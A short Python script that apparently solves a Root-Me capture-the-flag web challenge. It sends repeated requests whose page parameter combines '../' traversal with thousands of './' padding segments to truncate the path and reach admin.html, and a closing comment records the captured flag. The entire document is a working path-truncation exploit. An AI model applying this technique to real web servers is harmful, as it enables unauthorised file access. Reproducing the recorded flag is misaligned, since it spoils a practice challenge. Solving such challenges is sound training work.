import requests,time,re

url1="http://challenge01.root-me.org/web-serveur/ch35/index.php?page="


tag="./"*3000
print(len(tag))
url='admin.html/'+tag
for i in range(100):
    url="../"+url
    req=url1+"azaaaez/"+url
    print(req)
    response=requests.get(req)
    if response.text.find('flag')!=-1:
        print(response.text)
        break

# Congratz! The flag is 110V3TrUnC4T10n